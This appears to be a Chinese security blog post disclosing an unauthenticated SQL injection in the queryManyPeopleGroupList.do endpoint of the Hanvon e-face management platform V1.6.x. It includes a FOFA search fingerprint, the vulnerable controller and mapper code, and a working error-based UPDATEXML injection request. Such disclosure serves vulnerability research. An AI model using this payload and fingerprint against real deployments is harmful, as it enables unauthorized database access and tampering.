---
title: "汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querymanypeoplegrouplist.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/3 08:22
* 1121浏览
* [0评论](#comment)
* 37分钟阅读

深入探索

技术文章订阅

编程语言教程

安全


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理软件，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryManyPeopleGroupList.do` 接口存在 [SQL 注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `AuthMultiplePeopleOpenController` 里关于 `queryManyPeopleGroupList` 的实现

```
@Controller
@RequestMapping({"authMultiplePeople"})
public class AuthMultiplePeopleOpenController extends BaseController {
    protected Logger logger = TheApp.getLoggerAccess();
    @Autowired
    private IAuthMultiplePeopleOpenAsm authMultiplePeopleOpenAsm;
    @Autowired
    private IMultiplePeopleOpenAsm multiplePeopleOpenAsm;
    @Autowired
    MessageUtil messageUtil;

    @RequestMapping(
        value = {"queryManyPeopleGroupList.do"},
        method = {RequestMethod.GET}
    )
    @ResponseBody
    public RequestJson manyPeopleGroupListFordatatables(@RequestParam(required = false) Integer page, @RequestParam(required = false) Integer pageSize, @RequestParam(required = false) String name, @RequestParam(required = false) String order, @RequestParam(required = false) String columnKey) {
        RequestJson result = new RequestJson();

        try {
            if (page == null) {
                page = Constants.DEFAULT_START_PAGE_INDEX;
            }

            if (pageSize == null) {
                pageSize = Constants.PAGE_SIZE;
            }

            PageHelper.startPage(page, pageSize);
            ManyPeopleGroupParams record = new ManyPeopleGroupParams();
            if (null != name) {
                record.setName(name);
            }

            record.setOrder(order);
            record.setColumnKey(columnKey);
            List<ManyPeopleGroup> manyPeopleGroupList = this.authMultiplePeopleOpenAsm.queryManyPeopleGroupList(record);
            PageInfo<ManyPeopleGroup> info = new PageInfo(manyPeopleGroupList);
            Map<String, Object> map = new HashMap();
            map.put("items", info.getList());
            map.put("numRows", info.getTotal());
            map.put("page", info.getPageNum());
            map.put("pageSize", info.getPageSize());
            result = RequestJson.successResult(result, map, getMessage("basics_operate_fail"));
        } catch (Exception e) {
            String msg = getMessage("basics_go_wrong") + e.getLocalizedMessage();
            result = RequestJson.errorResult(result, msg);
            this.logger.error(msg);
            e.printStackTrace();
        }

        return result;
    }
```

深入探索

恶意软件分析工具

漏洞扫描器

数据库

直接看对应的 mapper xml文件 AccesManyPeopleGroupDao.xml

代码安全审计

```
<select id="queryManyPeopleGroupList" resultMap="BaseResultMap">
    select AMPG.ID,AMPG.NAME,AMPG.MEMO,
    (select COUNT(AMPE.EMPLOYEE_ID)
    from ACCESS_MANY_GROUP_EMPLOYEE AMPE
    LEFT JOIN SYS_USER EI ON EI.NG_ID = AMPE.EMPLOYEE_ID
    where AMPE.GROUP_ID = AMPG.ID AND EI.NT_USER_STATE = 1
    ) EMPLOYEE_SUM

    from ACCESS_MANY_PEOPLE_GROUP AMPG
    where 1=1
    <if test="name != null and name != ''">
      and AMPG.NAME like CONCAT('%',#{name}, '%')
    </if>
    ORDER BY
    <if test="order == null or order == ''">
      ID DESC
    </if>
    <if test="order != null and order != ''">
      ${columnKey} ${order}
    </if>
  </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /manage/authMultiplePeople/queryManyPeopleGroupList.do?recoToken=67mds2pxXQb&page=1&pageSize=10&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(123=123,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
```

[![汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](images/img-001-526b34e0b1f0.webp)](https://image.mrxn.net/34c7a4bc9bd24b0996a033adb39ee1ab.webp)

成功利用报错注入获取到数据版本号

漏洞修复方案

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html)  
文章链接：<https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

物流软件安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALY0lEQVR4AeybC3LcOBJE+8397+x1KfUoogg0KY9H3RtBxcDJ/FQRQpHWx7v/PB6PX3+yfn1+XK39jB/u9V3d+1n3N3DVU11c3av78j/BGsjvuvu/dzmBbSC/p/+4sq5uvPda1QEPYGUv9wQc6uCoVWOY6+XVcq+QHATVK1MLosOI5c2W9We4r90Gshfv69edwGEgME4fwq9u0afBPIz13Td3hpA+ELQPhANbC2B4e8xugc8LGHOf8vZWQnzrO5o/Q0gfGHFWdxjILHRrP3cC/3og/amBPAWrTwHi9zq5dZAcBLtvTn2GkFoIWtMR4ttj5UNy3V/V9dwV/q8HcuUmd+b6Cfy1gUCeHp8WGLlb6r46zPP6HSF5WKM13lMOqVEX9UV1UV1c6fp/gn9tIH9y87vmeAKHgTj1jsfSKJCnLezzzycAz/MQ3/vbCqLL9WdoRoTUQtCa7p9x6yB9zJ+hdR1ndYeBzEK39nMnsA0EMnV4jqutOX1Ifee9rvvynpOvfMj9AKMb9ho5MPycshX84QXM+0F0eI77224D2Yv39etO4B+fmu/iasv2gTwV5iD8zO95+QrtV7jKqMPzPZirXrXkIoz16pWt1Xlp3133G+IpvgkeBgJ5CmBE9wvR5SLMdX2fFLmovkJzMPaHcDhir+m99dXlHSG9r+YgeRhx1RfGHPA4DORxf7z0BP6BcUo+DR0hOfWzXZsTe14d0rf7MNet6/k9NyPC2AtGvq/dX1u/12bXq5w6jPdTF/c97zdkfxpvcH06EMh0nSaEX907JA9ztA+Mvrr469evj3+n6Nx9FerB2Ku8WhC9rmuZr+taEF8dRl6ZWjDqMPLK1IJRt68IR/90IBbf+DMnsA2kJloLxqmVVsvt1HUteJ6D+JXdr95HLu6z+2t9SN/OAaWPN2lWawAYflKHObfHqk7dnNh1+RXcBnIlfGf++xPYBgJ5SpwyhMMczYluFZJXh3AIrnLqK4TU976r/BUdxp72FiE+BO258iE5GNG89RBffY/bQAzf+NoT2AbilNxO512HTFkdws/qVr59REg/+dW6ykNqYUR7iJWtBWOutFo9V9psrXLqkP6z2q5tA+nGzV9zAttveyFThGDfzmraMOYhHILW2Q+ir7i6CMnDiPbdozVqK36mw/xe1kH8Fff+kNyK93rg/l3W480+tr+ynKIImW7fr/4KzevD2Ee95+Qwz/e6nge2nz9g7NGz8g/8/UfvLRd/Rz7+k4sf4pM/zMF8P5aaK9wGonnja09g+22v24BxmjW1WhAdRrROrGwtuQhjXWVqQXRzpe0XxIegnvln2LNySC8YUd+eMPoQri9aJ6pD8l3vvrzwfkPqFN5obd9luafVNNU7Qp4C68/Q+lUO5v1WdeqFMK+FuV41+wVjTs+9rjikDoLmRRh1CO/9Kn+/IXUKb7S2ryGQqUFwtUcYfacM0WFE/d4PktPvCKMP4bDG1T26Lof0krsHOcRXh/Duy1c5fbHnIH2B++eQx5t9HP7KcnoifE0Pvr7X9/OA+ObVv8shfawXIfqqn3qhNWdY2f2C3ANGXPWB5OyxynW95+V7PAykN7n5z57AciCQp6BvB6JDUB+ucUgOgtav0KdHXw6phy/sGbkIycpX6D30YV4Hc/3xeFj6gat+cKxfDuSj0/3Hj5/A4ecQyNT6VOVnuPoMVnXm9eUiZD8QVJ/l1eB5FuJD8FlPvUL7i6XVksO1fubF6uG63xBP4k1w+zlkNq39HiHTh+doH9EeMNapixBfLtpHhOQgaK4QRq3XyFcIqYdg9axlvq5rwejDyCtTC6JDsLT9gujwhfcbsj+hN7i+PBCfko5+Dupy+Jo6rH9+MW89pE4dRq5ufoZmOkJ6QbD79lLvXH2F5juu8ur7/OWBWHzjf3sCh++ynNbqtjB/unrePiKkTm4eosv1RXUYc10HlDYEhv+F4mZ8XkB8GPHT/qiFL09d7HtUh9TIO8LoQzhw/y7r8WYf919Z/08Dme119Zqahbx+K64u2g++V9frq4+aWFqtzkvbr6t+z8G45+7LV7jfg9f3G7I6rRfpy4HAOH0IhxHdN0SXd/QJgDEHI7fOvKguQurgiD0jF2GsURchvrzvAUbfHESHEfVF+8GYA+4v6o83+9jeEBin5RT7fs/0lQ/pry/2/pAcBPXNizNd7QztIfa8Oox7gHB9cVWvvsrp73EbyF68r193AttAnKII86cBortl83IRxlzXIb71K4TkYETz9t3jM2+fg/Q8y0Ny1kI4BK0XzXWE5CGob13hNhDNG197AttAYD41twfxa4r7BdEhaF40u+Iw1kE4BM/qIDk4/gKz3xu+snDMe68z7H1X+Z7rfFa3DWRm3trPn8D2D1T91jB/mmDUrTub/pefCrkY9bH9XwrUxe53XjnI3vQgvLxa6iLE7xxGvWr3C0Z/VQ/znL1mdfcb4qm8CR5+/Q7jVPs0zziM9X6eEB2CXb/KzYmQfoDSAYGPX6X3vfegvqgPqYegujmY6/rmV2iu8H5DVqf0In35NWS1H8jTUNOsBeE9X14tiF/X+wWj3us7h+QhuO/ltTWQjFwf